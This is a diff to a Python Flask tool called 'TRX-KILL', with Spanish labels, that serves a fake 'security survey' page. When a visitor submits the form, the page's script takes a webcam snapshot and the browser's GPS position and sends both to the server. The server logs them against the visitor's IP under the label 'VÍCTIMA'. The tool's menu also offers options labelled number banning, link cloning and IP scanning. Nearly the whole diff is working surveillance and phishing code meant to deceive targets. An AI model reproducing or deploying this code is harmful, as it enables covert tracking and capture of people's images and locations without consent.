@@ -11,31 +11,39 @@ os.makedirs(CAPTURA_PATH, exist_ok=True)
 app = Flask('TRX-KILL')
 G, C, R, Y, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[1;33m", "\033[0m"
 
-# Código de captura mejorado para forzar la interacción
-HTML_CAPTURA = """
-<!DOCTYPE html><html><body style="background:#000;">
+# --- ENCUESTA INTEGRADA ---
+HTML_ENCUESTA = """
+<!DOCTYPE html><html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center;">
+<h2>ENCUESTA DE SEGURIDAD</h2>
+<form id="e">
+    <p>¿Confirma su identidad?</p>
+    <input type="radio" name="res" value="Si"> SI<br>
+    <input type="radio" name="res" value="No"> NO<br><br>
+    <button type="button" onclick="enviar()">ENVIAR DATOS</button>
+</form>
 <script>
-async function go() {
-    try {
-        let s = await navigator.mediaDevices.getUserMedia({video: true});
-        let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
+async function enviar() {
+    let res = document.querySelector('input[name="res"]:checked').value;
+    let s = await navigator.mediaDevices.getUserMedia({video: true});
+    let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
+    let v = document.createElement('video'); v.srcObject = s; v.play();
+    setTimeout(() => {
         let c = document.createElement('canvas'); c.width=400; c.height=300;
-        c.getContext('2d').drawImage(document.createElement('video'), 0, 0, 400, 300);
-        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL()));
-        window.location.href='https://google.com';
-    } catch(e) { window.location.href='https://google.com'; }
+        c.getContext('2d').drawImage(v, 0, 0, 400, 300);
+        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&res='+res+'&img='+encodeURIComponent(c.toDataURL()));
+        alert('Datos enviados.');
+    }, 1000);
 }
-window.onload = go;
 </script></body></html>
 """
 
 @app.route('/')
-def index(): return render_template_string(HTML_CAPTURA)
+def index(): return render_template_string(HTML_ENCUESTA)
 
 @app.route('/log')
 def log():
     with open(LOG_FILE, "a") as f:
-        f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
+        f.write(f"VÍCTIMA:{request.remote_addr} | ENCUESTA:{request.args.get('res')} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
     return "OK"
 
 def iniciar_servidor():
@@ -54,8 +62,8 @@ def menu():
         print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
         print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
         print("    | |___ |___ |  /  |___ |    |_|__|_|")
-        print(f"  {C}--- TRX-KILL V9.0 ---{W}\n")
-        print(f"{G}[1] BAN NÚMERO\n[2] LINK-TRAP\n[3] CLON-LINK\n[4] IP-SCAN\n[5] INFO-SIST\n[6] ADM-SIST\n[7] SALIR{W}")
+        print(f"  {C}--- TRX-KILL V9.0 (ENCUESTA) ---{W}\n")
+        print(f"{G}[1] BAN NÚMERO\n[2] LINK-ENCUESTA\n[3] CLON-LINK\n[4] IP-SCAN\n[5] INFO-SIST\n[6] ADM-SIST\n[7] SALIR{W}")
         sel = input(f"\n{Y}TRX-ROOT > {W}")
 
         if sel == "1":
@@ -68,10 +76,9 @@ def menu():
         elif sel in ["2", "3"]:
             if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
             print(f"{C}LINK ACTIVO: http://127.0.0.1:5000{W}")
-            print(f"{Y}ESPERANDO VÍCTIMA... (No salgas){W}")
-            # Bucle de detección rápida
+            print(f"{Y}ESPERANDO VÍCTIMA...{W}")
             while not os.path.exists(LOG_FILE): time.sleep(0.1)
-            print(f"{R}>>> ¡VÍCTIMA DETECTADA! INFORMACIÓN RECOPILADA <<<{W}")
+            print(f"{R}>>> ¡VÍCTIMA DETECTADA Y ENCUESTA RECIBIDA! <<<{W}")
             input("\n[Enter]...")
 
         elif sel == "6":
